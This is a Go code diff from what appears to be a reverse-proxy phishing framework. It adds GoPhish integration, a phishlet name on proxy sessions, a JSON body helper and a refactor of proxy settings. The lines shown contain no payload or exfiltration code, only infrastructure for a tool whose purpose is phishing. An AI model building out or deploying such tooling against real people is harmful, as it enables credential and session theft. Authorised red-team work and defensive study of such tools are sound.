@@ -12,11 +12,13 @@ import (
 	"bytes"
 	"crypto/rand"
 	"crypto/rc4"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"html"
+	"io"
 	"io/ioutil"
 	"net"
 	"net/http"
@@ -34,6 +36,7 @@ import (
 
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
+	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 
@@ -62,6 +65,7 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
+	gophish           *GoPhish
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -73,13 +77,30 @@ type HttpProxy struct {
 	ip_sids           map[string]string
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
+	session_mtx       sync.Mutex
 }
 
+
 type ProxySession struct {
-	SessionId   string
-	Created     bool
-	PhishDomain string
-	Index       int
+	SessionId    string
+	Created      bool
+	PhishDomain  string
+	PhishletName string
+	Index        int
+}
+
+// set the value of the specified key in the JSON body
+func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return nil, err
+	}
+	data[key] = value
+	newBody, err := json.Marshal(data)
+	if err != nil {
+		return nil, err
+	}
+	return newBody, nil
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, proxies []string, developer bool) (*HttpProxy, error) {
@@ -90,6 +111,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
+		gophish:           NewGoPhish(),
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -105,13 +127,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		WriteTimeout: httpWriteTimeout,
 	}
 
-	if cfg.proxyEnabled {
-		err := p.setProxy(cfg.proxyEnabled, cfg.proxyType, cfg.proxyAddress, cfg.proxyPort, cfg.proxyUsername, cfg.proxyPassword)
+	if cfg.proxyConfig.Enabled {
+		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
 		if err != nil {
 			log.Error("proxy: %v", err)
 			cfg.EnableProxy(false)
 		} else {
-			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
+			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
 		}
 	}
 
